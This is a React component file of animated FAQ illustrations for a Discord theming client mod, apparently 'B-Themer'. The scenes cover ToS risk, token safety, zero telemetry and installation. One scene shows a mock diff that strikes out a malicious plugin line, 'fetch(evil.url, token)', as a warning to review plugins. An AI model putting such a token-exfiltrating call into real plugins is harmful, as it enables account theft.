import { motion, useReducedMotion } from "motion/react";
import { ArrowRight, Check, FileJson, Folder, Gem, KeyRound, Lock, RefreshCw, ShieldCheck, X } from "lucide-react";
import { siApple, siLinux } from "simple-icons";
import clsx from "clsx";
import { WindowsIcon } from "./icons";

export function FaqScene({ i }: { i: number }) {
  const S = SCENES[i];
  return S ? <S /> : null;
}

const mono = "font-mono text-[12px]";
const chip = "inline-flex items-center gap-1.5 rounded-md border border-line-strong bg-panel-2 px-2 py-1";
const Key = ({ k }: { k: string }) => (
  <kbd className="inline-grid h-8 min-w-9 place-items-center rounded-md border border-line-strong bg-panel-2 px-2 font-mono text-xs shadow-[0_3px_0_var(--line-strong)]">{k}</kbd>
);

function Ban() {
  return (
    <div className="relative h-full overflow-hidden rounded-xl border border-line">
      <div className="absolute inset-x-0 top-3 h-5 -rotate-2 bg-[repeating-linear-gradient(-45deg,#f5b301_0_14px,#111_14px_28px)] opacity-90" />
      <div className="absolute inset-x-0 bottom-3 h-5 rotate-1 bg-[repeating-linear-gradient(-45deg,#f5b301_0_14px,#111_14px_28px)] opacity-90" />
      <motion.div initial={{ scale: 1.6, opacity: 0, rotate: -14 }} animate={{ scale: 1, opacity: 1, rotate: -8 }} transition={{ type: "spring", stiffness: 420, damping: 18, delay: 0.15 }}
        className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 rounded-md border-[3px] border-[#e5484d] px-4 py-1.5 text-center font-mono text-[13px] leading-tight font-bold tracking-[0.18em] text-[#e5484d] uppercase">
        At your own risk<br /><span className="text-[10px] tracking-[0.3em] opacity-80">Discord ToS §client mods</span>
      </motion.div>
    </div>
  );
}

function Token() {
  return (
    <div className="flex h-full items-center justify-center gap-3 rounded-xl border border-line px-4">
      <span className={clsx(chip, mono)}><KeyRound className="size-3.5 text-[#f5b301]" />MTA4••••••••.••••.••••</span>
      <motion.span initial={{ x: -8, opacity: 0 }} animate={{ x: 0, opacity: 1 }} transition={{ delay: 0.2 }}><ArrowRight className="size-4 text-faint" /></motion.span>
      <span className={clsx(chip, mono)}><Lock className="size-3.5 text-[#23a55a]" />discord.com</span>
      <span className={clsx(chip, mono, "line-through opacity-40")}>anywhere else</span>
    </div>
  );
}

function Receipt() {
  const rows = [["Telemetry", "0"], ["Accounts", "0"], ["Crash reports", "0"]];
  return (
    <div className="flex h-full justify-center">
      <motion.div initial={{ y: -30 }} animate={{ y: 0 }} transition={{ duration: 0.6, ease: [0.22, 1, 0.36, 1] }}
        className="w-60 bg-[#f4f1ea] px-4 pt-2.5 pb-4 font-mono text-[11px] text-[#2b2b2b] [clip-path:polygon(0_0,100%_0,100%_calc(100%-6px),95%_100%,90%_calc(100%-6px),85%_100%,80%_calc(100%-6px),75%_100%,70%_calc(100%-6px),65%_100%,60%_calc(100%-6px),55%_100%,50%_calc(100%-6px),45%_100%,40%_calc(100%-6px),35%_100%,30%_calc(100%-6px),25%_100%,20%_calc(100%-6px),15%_100%,10%_calc(100%-6px),5%_100%,0_calc(100%-6px))]">
        <p className="text-center tracking-[0.25em] uppercase">Sent to us</p>
        <div className="my-1.5 border-t border-dashed border-[#2b2b2b]/40" />
        {rows.map(([k, v]) => <p key={k} className="flex justify-between"><span>{k}</span><span>{v}</span></p>)}
        <div className="my-1.5 border-t border-dashed border-[#2b2b2b]/40" />
        <p className="flex justify-between font-bold"><span>TOTAL</span><span>0 bytes</span></p>
      </motion.div>
    </div>
  );
}

function Review() {
  const lines: [string, string][] = [[" ", "BThemer.definePlugin({"], ["+", '  css: ".chat { border-radius: 12px }",'], ["-", "  start(api) { fetch(evil.url, token) }"], [" ", "});"]];
  return (
    <div className="relative h-full overflow-hidden rounded-xl border border-line bg-[#0c0c10] py-2 font-mono text-[11.5px] text-[#cdd6f4]">
      {lines.map(([s, t], n) => (
        <p key={n} className={clsx("flex gap-3 px-3", s === "+" && "bg-[#23a55a]/12 text-[#a6e3a1]", s === "-" && "bg-[#e5484d]/14 text-[#f5a3a6] line-through decoration-[#e5484d]/60")}>
          <span className="w-2 opacity-60">{s}</span>{t}
        </p>
      ))}
      <span className="absolute right-3 bottom-2 inline-flex items-center gap-1 rounded-full bg-[#23a55a]/15 px-2 py-0.5 text-[10px] font-semibold text-[#3ba55d]"><ShieldCheck className="size-3" />Read it before you add it</span>
    </div>
  );
}

function Ticket() {
  return (
    <div className="flex h-full items-center justify-center">
      <div className="relative flex h-24 w-72 overflow-hidden rounded-lg bg-gradient-to-r from-[#7f5af0] to-[#ff73fa] text-white [mask:radial-gradient(circle_at_70%_0,transparent_9px,#000_10px)_top/100%_51%_no-repeat,radial-gradient(circle_at_70%_100%,transparent_9px,#000_10px)_bottom/100%_51%_no-repeat]">
        <div className="flex flex-1 flex-col justify-center pl-4">
          <p className="flex items-center gap-1.5 text-[11px] tracking-[0.3em] uppercase opacity-80"><Gem className="size-3.5" />Admit one</p>
          <p className="text-2xl font-black tracking-tight italic">NITRO</p>
        </div>
        <div className="grid w-[30%] place-items-center border-l-2 border-dashed border-white/50 font-mono text-[10px] tracking-widest uppercase">your eyes<br />only</div>
        <motion.span initial={{ scale: 1.5, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} transition={{ type: "spring", stiffness: 380, damping: 16, delay: 0.2 }}
          className="absolute top-1/2 left-[34%] -translate-y-1/2 -rotate-12 rounded border-2 border-white px-2 font-mono text-[11px] font-bold tracking-widest">VISUAL ONLY</motion.span>
      </div>
    </div>
  );
}

function PriceTag() {
  return (
    <div className="flex h-full items-center justify-center">
      <motion.div initial={{ rotate: -18 }} animate={{ rotate: [-18, 6, -4, 0] }} transition={{ duration: 1.1, ease: "easeOut" }} style={{ transformOrigin: "8% 50%" }}
        className="relative flex h-16 items-center gap-3 bg-[#f4f1ea] pr-5 pl-9 text-[#1d1d1f] [clip-path:polygon(18px_0,100%_0,100%_100%,18px_100%,0_50%)]">
        <span className="absolute top-1/2 left-[14px] size-2.5 -translate-y-1/2 rounded-full bg-bg ring-1 ring-black/20" />
        <span className="text-3xl font-black tracking-tight">$0</span>
        <span className="font-mono text-[10px] leading-tight uppercase opacity-70">forever<br />MIT licence</span>
      </motion.div>
    </div>
  );
}

function Escape() {
  return (
    <div className="flex h-full items-center justify-center gap-5 rounded-xl border border-line">
      <span className="flex items-center gap-1.5"><Key k="Ctrl" /><Key k="Alt" /><Key k="A" /></span>
      <ArrowRight className="size-4 text-faint" />
      <span className="flex items-center gap-2.5 text-sm">
        <span className="relative h-5 w-9 rounded-full bg-line-strong"><motion.span className="absolute top-0.5 size-4 rounded-full bg-white shadow" initial={{ left: 18 }} animate={{ left: 2 }} transition={{ delay: 0.4, type: "spring", stiffness: 500, damping: 30 }} /></span>
        Be Themer off
      </span>
    </div>
  );
}

function Reload() {
  const reduce = useReducedMotion();
  return (
    <div className="flex h-full items-center justify-center gap-5 rounded-xl border border-line">
      <span className="flex items-center gap-1.5"><Key k="Ctrl" /><Key k="R" /></span>
      <motion.span animate={reduce ? undefined : { rotate: 360 }} transition={{ duration: 1.4, repeat: Infinity, ease: "linear" }}><RefreshCw className="size-6 text-[#5865f2]" /></motion.span>
      <span className="text-sm text-muted">or tray icon → Quit</span>
    </div>
  );
}

function Path() {
  const parts = ["%APPDATA%", "B-Themer"];
  return (
    <div className="flex h-full flex-col justify-center gap-2 rounded-xl border border-line px-4">
      <div className={clsx("flex items-center gap-1 overflow-hidden rounded-md bg-panel-2 px-2 py-1.5", mono)}>
        {parts.map((p, n) => <span key={p} className="flex items-center gap-1"><Folder className="size-3.5 text-[#f5b301]" fill="#f5b301" fillOpacity={0.3} />{p}<span className="text-faint">›</span>{n === parts.length - 1 && null}</span>)}
      </div>
      <div className={clsx("flex flex-wrap gap-1.5", mono)}>
        {["settings.json", "themes", "plugins", "logs"].map((f, n) => (
          <motion.span key={f} initial={{ opacity: 0, y: 4 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.1 + n * 0.07 }} className={chip}>
            {f.includes(".") ? <FileJson className="size-3.5 text-[#7dd3fc]" /> : <Folder className="size-3.5 text-[#f5b301]" />}{f}
          </motion.span>
        ))}
      </div>
    </div>
  );
}

function Consent() {
  return (
    <div className="relative h-full overflow-hidden rounded-xl border border-line">
      <div className="flex h-6 items-center justify-center gap-1.5 bg-[#e5484d] text-[11px] font-semibold text-white">
        <motion.span className="size-1.5 rounded-full bg-white" animate={{ opacity: [1, 0.25, 1] }} transition={{ duration: 1, repeat: Infinity }} />REC 00:42
      </div>
      <div className="flex items-start gap-2.5 px-3 py-2.5 text-[12.5px]">
        <span className="grid size-7 shrink-0 place-items-center rounded-full bg-[#5865f2] text-[10px] font-bold text-white">M</span>
        <p><b className="font-semibold">Meow</b> <span className="text-muted">Recording started: this voice call is being recorded</span></p>
      </div>
    </div>
  );
}

function Platforms() {
  const Brand = ({ path }: { path: string }) => <svg viewBox="0 0 24 24" className="size-6" fill="currentColor" aria-hidden><path d={path} /></svg>;
  return (
    <div className="grid h-full grid-cols-3 gap-2">
      <div className="flex flex-col items-center justify-center gap-1.5 rounded-xl border border-[#0a84ff]/50 bg-[#0a84ff]/10 text-[#0a84ff]"><WindowsIcon className="size-6" /><span className="text-xs font-semibold">Windows 10, 11</span></div>
      {[["macOS", siApple.path], ["Linux", siLinux.path]].map(([n, p]) => (
        <div key={n} className="flex flex-col items-center justify-center gap-1.5 rounded-xl border border-dashed border-line-strong text-faint"><Brand path={p} /><span className="text-xs">{n} · not yet</span></div>
      ))}
    </div>
  );
}

function Rename() {
  return (
    <div className="flex h-full items-center justify-center gap-3 rounded-xl border border-line px-3">
      <span className={clsx(chip, mono)}>app.asar</span>
      <ArrowRight className="size-4 text-faint" />
      <motion.span initial={{ opacity: 0, x: -6 }} animate={{ opacity: 1, x: 0 }} transition={{ delay: 0.25 }} className={clsx(chip, mono)}>app.orig.asar</motion.span>
      <span className="text-faint">+</span>
      <motion.span initial={{ opacity: 0, scale: 0.8 }} animate={{ opacity: 1, scale: 1 }} transition={{ delay: 0.5 }} className={clsx(chip, mono, "border-[#23a55a]/50 text-[#3ba55d]")}>loader</motion.span>
    </div>
  );
}

function Uac() {
  return (
    <div className="grid h-full grid-cols-2 gap-2 text-[13px]">
      <div className="flex items-center gap-2.5 rounded-xl border border-dashed border-line-strong px-3 text-faint">
        <ShieldCheck className="size-5 text-[#f5b301]/60" /><span className="line-through">Run as administrator</span><X className="ml-auto size-4" />
      </div>
      <div className="flex items-center gap-2.5 rounded-xl border border-[#23a55a]/40 bg-[#23a55a]/8 px-3">
        <Folder className="size-5 text-[#3ba55d]" /><span>Your user folder</span><Check className="ml-auto size-4 text-[#3ba55d]" />
      </div>
    </div>
  );
}

function Uninstall() {
  return (
    <div className="flex h-full flex-col justify-center gap-2.5 rounded-xl border border-line px-4">
      <div className="flex justify-between text-[12.5px]"><span>Restoring Discord's app.asar</span><span className="font-mono text-muted">done</span></div>
      <div className="h-1.5 overflow-hidden rounded-full bg-line-strong">
        <motion.div className="h-full rounded-full bg-fg" initial={{ width: "0%" }} animate={{ width: "100%" }} transition={{ duration: 1.1, ease: [0.65, 0, 0.35, 1] }} />
      </div>
      <span className={clsx(chip, mono, "w-fit")}><Check className="size-3.5 text-[#3ba55d]" />settings kept in %APPDATA%\B-Themer</span>
    </div>
  );
}

const SCENES = [Ban, Token, Receipt, Review, Ticket, PriceTag, Escape, Reload, Path, Consent, Platforms, Rename, Uac, Uninstall];
